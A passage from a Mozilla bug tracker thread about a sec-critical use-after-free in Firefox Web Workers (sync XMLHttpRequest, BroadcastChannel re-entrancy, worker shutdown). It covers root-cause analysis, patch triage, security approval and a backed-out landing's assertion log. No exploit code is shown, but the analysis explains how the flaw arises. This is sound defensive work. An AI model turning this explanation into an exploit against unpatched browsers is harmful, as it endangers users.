    it is being used in an explicitly asynchronous fashion. This is a unique

    distinction for workers, but a necessary and fundamental distinction in the

    face of `self.close()`. APIs such as BroadcastChannel and MessageChannel

    have explicitly async dispatches (at least for our IPC handlers; there

    may be some edge-cases for MessageChannels for freshly created channels that

    haven't had their ports shipped/entangled/etc.). In these cases, any

    attempt shoudl 100% fail after self.close() is called. The only wackiness

    we allow with sync XHR/etc. is that the stack be unwound. No further

    tasks should ever get to run.
* The syncloop reentrancy/mPostSyncLoopOperations-double-invocation needs harder

  guards that ensure we aren't allowed to start a new syncloop while popping the

  current one. A lesser option would be to reorder the stack consultation so

  that we noticed we're at 1 to sensitize for the call but don't actually pop

  down to 0 until the return, which would result in the nested seeing a 2->1

  transition instead of an additional, duplicative 1->0 transition, but it's

  really not okay to be pushing an additional syncloop. (Syncloops should only

  be allowed to be entered when in content, but it's not okay to be in content

  at that time.)

I'll attempt to get a candidate set of fixes with appropriate reproduction confirmations of this tomorrow. (That is, the reproduction should properly trigger failsafe assertions in the initial draft of the patch, and then the reproduction should only generate errors in the second draft of the patch wherein the invariants are properly guarded against without triggering the backstop crashing assertions.) This may spill into Friday as I try and better validate that I understand how the actual use-after-free is occurring.

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a9682275_151407)• 5 years ago |

Priority: P2 → P1

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1545345#c14)• 5 years ago |
|  | |

re-rating sec-critical based on [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest")'s PoC (EIP control, not just ASAN detection)

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a10066826_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1545345#c16)• 5 years ago |
|  | |

I'm experiencing difficulty right now reproducing on nightly under linux64 opt, debug, or opt asan under both reproduction test cases including with a release assert on calling into JS content when ClearMainEventQueue and running asan and opt under rr (primarily attempting to offset my fast multi-core machine by serializing execution). And this includes running multiples tabs concurrently.

We did correct our worker thread priority from being below-normal to normal though (which I think is a significant priority difference on windows), so it's likely we've made it harder to reproduce the exact situation in question.

Tomorrow I'll endeavor to create a variation that just spams BroadcastChannel messages to trigger content re-entrancy in syncloop unwinding after self.close() is involved. That should be sufficient to validate the hard backstop content re-entrancy guards and the broadcast channel DOMEventTargetHelper guards. Once that's working (and those guards disabled again) it should be simple enough to expose an oracle to content to let it know when to trigger a nested syncloop and to verify we avoid attempting to perform the last-syncloop actions twice.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1545345#c17)• 5 years ago |
|  | |

I'll also pursue local windows builds since that's the platform of greatest concern. Also if anyone has any recent reproduction backtraces on hand, please do paste/attach them to the bug as it would be useful to help account for code drift. (But no need to go out of your way. It's clear the content re-entrancy issues continues to exist even if it's somewhat harder to reproduce them.)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1545345#c18)• 5 years ago |
|  | |

Status update:

* Reproducing BroadcastChannel re-entrancy is in fact very easy. I created a mochitest for reproduction assistance.
* Reproducing the GC problem that led to the crash has been harder against trunk, so I'm planning to reproduce on the original revision and then potentially bisect a bit.
  + In my [comment 13](/show_bug.cgi?id=1545345#c13 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") analysis I was overly focused on the re-entrancy invariants and that Yaron's ASAN repro provided evidence of this, but I'm still trying to reconstruct how we could end up with both an XMLHttpRequestWorker in the snow-white list that gets MaybeKillObject()ed (meaning it has a 0 refcount at the time of deletion) as well as have the dom::Event whose underlying WidgetEvent has an nsCOMPtr reference to the same XMLHttpRequestWorker itself be in the snow-white list. By rolling back to the code at the time of a known repro, I hope to reproduce under rr/pernosco and then leverage that to create a more targeted reproducing test and verify how that applies to trunk through the impending release.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1545345#c19)• 5 years ago |
|  | |

We can't realistically get a safe fix for this for Fx69 ahead of next week's RC, so updating the flags accordingly.

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1545345#c20)• 5 years ago |
|  | |

I've reproduced on the old build under ASAN, but naive efforts at reproducing under rr chaos and non-chaos didn't immediately work, so I'll be iterating a little bit.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1545345#c21)• 5 years ago |
|  | |

Got a variant on the test to reproduce on the old code under rr and am currently analyzing in pernosco via pernosco-submit.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1545345#c22)• 5 years ago |
|  | |

Okay, wow.

[https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f{m[BNhV,fvs\_,t[sA,UXg\_,f{e[BNhV,fvI\_,s{af4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA](https://pernos.co/debug/Op7WisIFoj25NC1245b9Cw/index.html#f%7Bm%5BBNhV,fvs_,t%5BsA,UXg_,f%7Be%5BBNhV,fvI_,s%7Baf4mB4IAA,bAdQ,oDXIuoQ,uDWRuTA)\_\_\_

nsIGlobalObject::DisconnectEventTargetObjects in WorkerGlobalScope::NoteTerminating in WorkerPrivate::ProcessAllControlRunnablesLocked in WorkerPrivate::InterruptCallback in JSContext::handleInterrupt in JS callstack in BC::Msg DispatchEvent in DestroySyncLoop/ClearMainEventQueue in XHRW::Send/SendInternal in BC::Msg in Destroy/Clear in XHRW::Send/SendI in BC::Msg ETC ETC

The key things here are:

* We have a sync event dispatch on the stack into JS space. The dispatch to the target does not have a kung fu death grip and assumes that mProxy continues to hold a strong ref to the XHRW.
* WE ARE PROCESSING CONTROL RUNNABLES IN THE MIDDLE OF ARBITRARY JS CONTENT IN THE INTERRUPT CALLBACK.
* WE ARE DISCONNECTING THE EVENT TARGETS IN THE MIDDLE OF SYNCHRONOUS EVENT DISPATCH.

Some of these things are concerning. I leave it as an exercise to the reader to infer which ones most terrifyingly are violating invariants...

Note that the intents here I think are reasonable. We do want to ensure that an infinite looping worker can be terminated by its parent/owner. That's absolutely reasonable. However, much like the syncloop semantics that defer the actual ramifications of self.close() until the stack is successfully unwound, we should not be actually undertaking the teardown of the global in this manner while we have potentially multiple syncloops on the stack as well as event dispatch. (However, it's fine to ensure that all JS content frames for the global immediately error all the way up the stack... the idea is just that much like the cycle collector hygienically defers the actual deletion of objects, it's wiser for us to defer DETH-disconnect and strong reference dropping until there's no longer any content and naive C++ frames on the stack. Although we should ensure kung fu grips are held in places where they aren't currently held but should be held...)

The particular test I used to reproduce this problem has also resulted in the given scenario happening inside asymmetrically paired Pin/Unpin calls, so that may also be involved or the dominant issue. I'll look into that tomorrow as well.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1545345#c23)• 5 years ago |
|  | |

Andrew - are you still working on this issue? Anyone else you could pull into it for help?

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1545345#c24)• 5 years ago |
|  | |

Still working, yes. Expect an update soon.

Flags: needinfo?(bugmail)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1545345#c25)• 5 years ago |
|  | |

I'll keep tracking this for 70 to keep it on the radar for potential dot release.

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1545345#c26)• 5 years ago |
|  | |

(In reply to Andrew Sutherland [:asuth] (he/him) from [comment #24](/show_bug.cgi?id=1545345#c24 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"))

> Still working, yes. Expect an update soon.

Hi Andrew, do you have an update on this bug? Thanks

Flags: needinfo?(bugmail)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16124908_1689)• 5 years ago |

See Also: → [CVE-2019-17008](/show_bug.cgi?id=1546331 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16361308_516138)• 5 years ago |

See Also: → [1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345")

|  | [Eden Chuang[:edenchuang]](/user_profile?user_id=516138) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a16884831_516138)• 5 years ago |

See Also: [CVE-2019-17008](/show_bug.cgi?id=1546331 "RESOLVED FIXED - Web Workers - Use After Free in RegisterDebuggerMainThread()") →

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1545345#c27)• 5 years ago |
|  | |

(For those playing along at home, Andrew Sutherland told me he's trying to figure out why this isn't reproducible on more recent builds (or how the testcase needs to be changed to do so)).

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1545345#c28)• 5 years ago |
|  | |

Too late for a fix in 70 at this point.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1545345#c29)• 5 years ago |
|  | |

Finishing up attempting creating reproduction test case.

Flags: needinfo?(bugmail)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1545345#c30)• 5 years ago |
|  | |

We could still potentially get a patch into 72 beta, tracking for 72.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1545345#c31)• 5 years ago |
|  | |

Too late for 71.

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1545345#c32)• 5 years ago |
|  | |

72 seems unlikely now.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a22150195_580382)• 5 years ago |

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a23045254_451704)• 5 years ago |

[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=affected)
[tracking-firefox74](/buglist.cgi?f1=cf_tracking_firefox74&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a25188626_75935)• 5 years ago |

[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1545345#c33)• 5 years ago |
|  | |

Attempts to re-create this on trunk post-landing of [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") seem to indicate that the problem has been mitigated since that landed in 72. I believe the particular permutation of events was the Sync XHR on the stack twice with the DETH global destruction on the stack (and then multiple Unpin calls lined up). Since it's no longer possible to get the same Sync XHR on the stack twice, the UAF is mitigated.

I'm going to start putting up patches later today with variants of

1. Allow the global to mark when JS shouldn't run.
2. Have BroadcastChannel/friends check to not even bother trying to run JS in the closing state.
3. Defer global destruction until the stack has actually unwound.

Any of the 3 would have prevented the problem, although all 3 are required for sanity/correctness.

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1545345#c34)• 5 years ago |
|  | |

Too late for 74.

[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix)
[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=affected)
[tracking-firefox75](/buglist.cgi?f1=cf_tracking_firefox75&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox75&o1=equals&v1=%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a27270812_75935)• 5 years ago |

Depends on: [1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416")

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1545345#c35)• 5 years ago |
|  | |

For the fixes here, we'll also want [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") uplifted to esr68 to help mitigate. I've requested uplift approval for the fix on that bug.

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1545345#c37)• 5 years ago |
|  | |

Is this ready for sec-approval?

[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected)
[tracking-firefox76](/buglist.cgi?f1=cf_tracking_firefox76&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B)Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1545345#c38)• 5 years ago |
|  | |

No, we want :baku's review as well. I've upgraded his review request to blocking to make that clear.

Relatedly, has our taskcluster migration given us a private try server that we can safely push security fixes to in order to have better test coverage than my local testing?

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1545345#c39)• 5 years ago |
|  | |

Setting NI on baku for review as well.

Flags: needinfo?(amarchesini)

|  | [Andrea Marchesini [:baku]](/user_profile?user_id=446257) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a28553246_446257)• 5 years ago |

Flags: needinfo?(amarchesini)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1545345#c40)• 5 years ago |
|  | |

I'm currently running additional local tests against trunk and ESR68. :RyanVM indicated via other channels that there is not currently a private try server available.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1545345#c41)• 5 years ago |
|  | |

The exact test-case no longer reproduced, but I've been concerned about other potential syncloop gadgets so now after some assistance from :jkratzer I'm pursuing directed fuzzing. The question I'm trying to answer is whether we've already mitigated the class of UAFs initially seen on this bug, and if so, on which releases it's mitigated. The rationale is that there is some level of analytic complexity risk from the fix and it would be preferable to land it on trunk only, at least initially.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1545345#c42)• 5 years ago |
|  | |

And by class of UAFs I mean:

* MessageChannel/BroadcastChannel allow content to run during syncloop destruction.
* Syncloop-using APIs are called during syncloop destruction in a way that allows for use-after-frees due to bad assumptions in syncloop-using code. (This may have required bad assumptions in conjunction with unsafe uses of raw pointers in cases that erroneously assume the raw pointer usage was covered by a strong reference.)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1545345#c43)• 5 years ago |
|  | |

Sounds like this might be too risky to land late in the beta cycle, so I'll call it wontfix for 75; hopefully we can have it bake some more on 76.

[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1545345#c44)• 5 years ago |
|  | |

Comment on [attachment 9130470](/attachment.cgi?id=9130470 "Bug 1545345 - Improve worker shutdown. r=baku,smaug") [[details]](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown. r=baku,smaug

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not 100% clear at this time. It's possible that the landing of [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") (which is now on all supported branches including ESR68) solved the only UAF. I'm attempting local fuzzing to see if other issues might exist, but we can consider sec-approval in parallel to me finishing that up.

This patch is about closing holes that definitely result in invariants being violated. We do know how to violate the invariants from tests, we don't know how to cause a UAF.

If someone suspects that the patch might be related to a secbug, they might be suspicious of things involving syncloops and content re-entrancy. This would give them a general idea of what to pursue, but various things that have landed (workers run at higher priorities, we do more global checks, etc.) should have upped the difficulty level.

We do have bugs on generally improving the state of workers so we could try and land this under the auspices of a bug like [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow").

* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Unknown
* **Which older supported branches are affected by this flaw?**: esr68?
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: The patch was intentionally designed to not be risky, but it's still touching/fixing stuff that's scary. In discussion with RyanVM (and his discussions), we've been talking about letting this just ride the train on nightly to beta and in general seeing how it bakes.
[Attachment #9130470](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug") -
Flags: sec-approval?

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a29476542_646284)• 5 years ago |

No longer blocks: [1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a29524244_1689)• 5 years ago |

[Attachment #9130470](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1545345#c45)• 5 years ago |
|  | |

> If someone suspects that the patch might be related to a secbug,

We assume they will identify security patches since the check-in comment will have a bug reference that's not accessible, or suspiciously omit the bug number. The latter is bad for us in the future ("why is this here?") so please do put in the bug number.

sec-approval+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1545345#c46)• 5 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/e608cbaf20d451fe0dd63e778ffa3f9408b8c43d>

Backed out for assertion failures on WorkerPrivate.cpp:

<https://hg.mozilla.org/integration/autoland/rev/a2d6508940de2b5cea50e409f6d00ee57711938c>

Push with failures: <https://treeherder.mozilla.org/#/jobs?repo=autoland&group_state=expanded&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&revision=e608cbaf20d451fe0dd63e778ffa3f9408b8c43d&selectedJob=295001539>

Failure log: <https://treeherder.mozilla.org/logviewer.html#?job_id=295001539&repo=autoland>

devtools/client/aboutdebugging/test/browser/browser\_aboutdebugging\_devtoolstoolbox\_reload.js

[task 2020-03-27T05:39:54.830Z] 05:39:54 INFO - GECKO(3816) | Assertion failure: mSyncLoopStack.IsEmpty(), at /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:3512

[task 2020-03-27T05:39:54.910Z] 05:39:54 INFO - GECKO(3816) | #01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int) [dom/workers/WorkerPrivate.cpp:3931]

[task 2020-03-27T05:39:54.910Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.911Z] 05:39:54 INFO - GECKO(3816) | #02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() [dom/workers/WorkerPrivate.cpp:3905]

[task 2020-03-27T05:39:54.911Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.913Z] 05:39:54 INFO - GECKO(3816) | #03: mozilla::dom::`anonymous namespace'::LoadAllScripts(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr<mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete<mozilla::dom::SerializedStackHolder> >, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) [dom/workers/ScriptLoader.cpp:2242] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #04: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr<mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete<mozilla::dom::SerializedStackHolder> >, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) [dom/workers/ScriptLoader.cpp:2349] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #05: mozilla::dom::`anonymous namespace'::CompileScriptRunnable::WorkerRun(JSContext\*, mozilla::dom::WorkerPrivate\*) [dom/workers/WorkerPrivate.cpp:343]

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #06: mozilla::dom::WorkerRunnable::Run() [dom/workers/WorkerRunnable.cpp:371]

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #07: nsThread::ProcessNextEvent(bool, bool\*) [xpcom/threads/nsThread.cpp:1222]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #08: NS\_ProcessNextEvent(nsIThread\*, bool) [xpcom/threads/nsThreadUtils.cpp:481]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #09: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext\*) [dom/workers/WorkerPrivate.cpp:2912]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #10: mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run() [dom/workers/RuntimeService.cpp:2301]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #11: nsThread::ProcessNextEvent(bool, bool\*) [xpcom/threads/nsThread.cpp:1222]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.917Z] 05:39:54 INFO - GECKO(3816) | #12: NS\_ProcessNextEvent(nsIThread\*, bool) [xpcom/threads/nsThreadUtils.cpp:481]

[task 2020-03-27T05:39:54.917Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #13: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate\*) [ipc/glue/MessagePump.cpp:332]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #14: MessageLoop::RunInternal() [ipc/chromium/src/base/message\_loop.cc:315]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #15: MessageLoop::RunHandler() [ipc/chromium/src/base/message\_loop.cc:309]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO - GECKO(3816) | #16: MessageLoop::Run() [ipc/chromium/src/base/message\_loop.cc:291]

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO -

